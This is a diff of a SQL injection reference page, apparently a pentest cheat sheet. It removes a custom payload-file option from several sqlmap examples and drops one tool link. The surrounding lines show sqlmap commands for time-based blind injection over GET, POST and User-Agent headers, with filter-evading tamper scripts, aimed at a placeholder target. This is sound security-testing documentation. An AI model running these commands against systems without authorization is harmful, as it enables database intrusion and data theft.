@@ -75,7 +75,6 @@ sqlmap -u "https://target.com/page?id=1" \
   --time-sec=10 \
   --level=3 \
   --risk=1 \
-  --payload-file=SQLi/sqlmap_timebased.xml
 ```
 
 **SQLMap — HTTP POST**
@@ -86,7 +85,6 @@ sqlmap -r /tmp/target.txt \
   --time-sec=10 \
   --level=3 \
   --risk=1 \
-  --payload-file=SQLi/sqlmap_timebased.xml
 ```
 
 **SQLMap — HTTP Header injection**
@@ -98,7 +96,6 @@ sqlmap -u "https://target.com/page" \
   --level=5 \
   --risk=3 \
   -p "User-Agent" \
-  --payload-file=SQLi/sqlmap_timebased.xml \
   --random-agent
 ```
 
@@ -108,7 +105,6 @@ sqlmap -u "https://target.com/page" \
 sqlmap -u "https://target.com/page?id=1" \
   --technique=T \
   --time-sec=10 \
-  --payload-file=SQLi/sqlmap_timebased.xml \
   --tamper=space2comment,between,randomcase
 ```
 
@@ -127,7 +123,6 @@ sqlmap -u "https://target.com/page?id=1" \
 
 - [sqlmap](https://github.com/sqlmapproject/sqlmap): Automatic SQL injection and database takeover tool.
 - [ffuf](https://github.com/ffuf/ffuf): Fast web fuzzer written in Go.
-- [ghauri](https://github.com/r0oth3x49/ghauri): Advanced SQL injection detection and exploitation tool.
 - [Burp Suite](https://portswigger.net/burp): Web security testing platform.
 
 - - -
